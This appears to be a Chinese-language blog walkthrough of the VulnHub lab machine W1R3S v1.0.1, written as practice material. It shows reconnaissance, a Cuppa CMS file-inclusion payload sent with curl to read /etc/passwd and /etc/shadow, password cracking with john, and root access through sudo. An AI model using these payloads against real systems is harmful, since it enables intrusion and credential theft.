+++
date = '2026-10-24T09:57:00+08:00'
draft = false
title = '[VulnHub靶机]w1r3s.v1.0.1渗透记录'
tags = ['渗透','Vulnhub','cuppacms','LFI','sudo']
+++

## 信息收集

攻击机IP: 192.168.200.146
使用arp-scan发现靶机IP(192.168.200.163)

```shell
┌──(root㉿kali)-[/home/kali/w1r3s]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.163 00:0c:29:67:23:90       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.054 seconds (124.63 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(root㉿kali)-[/home/kali/w1r3s]
└─# nmap --min-rate 10000 -p- 192.168.200.163
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 09:59 +0800
Nmap scan report for 192.168.200.163
Host is up (0.00011s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:67:23:90 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 12.90 seconds
```

详细扫描开放的端口, 注意到ftp允许匿名登录

```shell
┌──(root㉿kali)-[/home/kali/w1r3s]
└─# nmap -sT -sV -sC -p21,22,80,3306 192.168.200.163
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-24 10:01 +0800
Nmap scan report for 192.168.200.163
Host is up (0.00037s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.200.146
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:67:23:90 (VMware)
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.94 seconds
```

访问靶机Web服务, 是Apache默认页

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E8%AE%BF%E9%97%AEWeb%E6%9C%8D%E5%8A%A1.avif)

gobuster扫描网站目录, 发现administrator页面

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ gobuster dir -u http://192.168.200.163/ -w /usr/share/wordlists/dirb/big.txt       
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.200.163/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 299]
.htpasswd            (Status: 403) [Size: 299]
administrator        (Status: 301) [Size: 326] [--> http://192.168.200.163/administrator/]
javascript           (Status: 301) [Size: 323] [--> http://192.168.200.163/javascript/]
server-status        (Status: 403) [Size: 303]
wordpress            (Status: 301) [Size: 322] [--> http://192.168.200.163/wordpress/]
Progress: 20469 / 20469 (100.00%)
===============================================================
Finished
===============================================================
```

访问administrator, 是个安装页面, 这是一个cuppacms系统

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E8%AE%BF%E9%97%AEadministrator.avif)

点Next, 可以看到默认的数据库与管理员账户信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8E%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF.avif)

审查元素, 将input元素的type属性改为text, 即可发现密码是admin

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/password%E6%94%B9text.avif)

/wordpress目录扫描后跳转到了localhost, 直接访问/wordpress/wp-login.php发现登录框, 但点击登录后仍然跳转到了localhost

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E7%99%BB%E5%BD%95%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0localhost.avif)

由于之前的nmap扫描结果显示ftp服务允许匿名登录, 我们试一下

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ ftp 192.168.200.163
Connected to 192.168.200.163.
220 Welcome to W1R3S.inc FTP service.
Name (192.168.200.163:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

登录成功, 使用ls发现里面有3个文件夹

```shell
ftp> ls
229 Entering Extended Passive Mode (|||40186|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
ftp> ls content
229 Entering Extended Passive Mode (|||43843|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt
-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt
-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt
226 Directory send OK.
ftp> ls docs
229 Entering Extended Passive Mode (|||46335|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt
226 Directory send OK.
ftp> ls new-employees
229 Entering Extended Passive Mode (|||43893|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt
226 Directory send OK.
ftp>
```

把它们全部下载下来, 发现02.txt中有一串md5字符串和base64字符串

```text
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################
```

使用[somed5](https://www.somd5.com/)解密md5, 发现结果是"This is not a password"

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/md5%E8%A7%A3%E5%AF%86.avif)

对base64解码, 发现也是一段文字"It is easy, but not that easy.."

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ echo 'SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==' | base64 -d
It is easy, but not that easy..
```

worktodo.txt中是倒过来的文本

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ cat worktodo.txt      
        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```

对将图像选择180°, 发现第一行内容是"we have a lot of work to do, stop playing around...."   
第二行反转字符串得到"I don't think this is the way to root!"

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E6%97%8B%E8%BD%AC180%C2%B0.avif)

employee-names.txt中记录了员工姓名

```text
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources
```

## 漏洞利用
使用searchsploit搜索cuppa漏洞, 发现其存在文件包含漏洞

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ searchsploit cuppa
--------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                           |  Path
--------------------------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                          | php/webapps/25971.txt
--------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

阅读可知, `alert/alertConfigField.php`存在文件包含漏洞, 当`urlConfig`为`../../../../../../../../../etc/passwd`时, 会返回passwd信息

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/exp%E9%98%85%E8%AF%BB.avif)

尝试访问`http://192.168.200.163/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, 发现404

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/cuppa404.avif)

因为之前Install页面的URL以Administrator开头, 所以换成`http://192.168.200.163/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, 访问发现变化, 但仍无法读出数据

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/administrator%E5%8F%98%E5%8C%96.avif)

去github上找到cuppacms官方仓库读取源代码, 发现它接受POST参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E9%98%85%E8%AF%BB%E6%BA%90%E7%A0%81.avif)

使用POST命令传递参数, 发现返回了passwd文件内容

```shell
┌──(kali㉿kali)-[~/w1r3s]                     
└─$ curl 'http://192.168.200.163/administrator/alerts/alertConfigField.php' -X POST -d "urlConfig=../../../../../../../../../etc/passwd"
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E8%BF%94%E5%9B%9Epasswd%E5%86%85%E5%AE%B9.avif)

尝试读取shadow文件, 发现返回其内容

```shell
┌──(kali㉿kali)-[~/w1r3s]        
└─$ curl 'http://192.168.200.163/administrator/alerts/alertConfigField.php' -X POST -d "urlConfig=../../../../../../../../../etc/shadow"
```

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/w1r3s/%E8%BF%94%E5%9B%9Eshadow%E5%86%85%E5%AE%B9.avif)

将root和w1r3s用户的哈希保存下来, 使用john爆破, 发现w1r3s的密码为computer

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passhash.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
computer         (w1r3s)
```

使用用户名w1r3s, 密码computer登录ssh

```shell
┌──(kali㉿kali)-[~/w1r3s]
└─$ ssh w1r3s@192.168.200.163                      
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.200.163's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

108 packages can be updated.
6 updates are security updates.

.....You made it huh?....
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
w1r3s@W1R3S:~$
```

## 权限提升

使用sudo -l, 发现能以root权限执行任何命令

```shell
w1r3s@W1R3S:~$ sudo -l
[sudo] password for w1r3s: 
Matching Defaults entries for w1r3s on W1R3S.localdomain:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S.localdomain:
    (ALL : ALL) ALL
```

直接提权读flag

```shell
w1r3s@W1R3S:~$ sudo su
root@W1R3S:/home/w1r3s# cd /root
root@W1R3S:~# ls
flag.txt
root@W1R3S:~# cat flag.txt 
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| 
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ 
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ 
                                                                                        
-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \ 
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```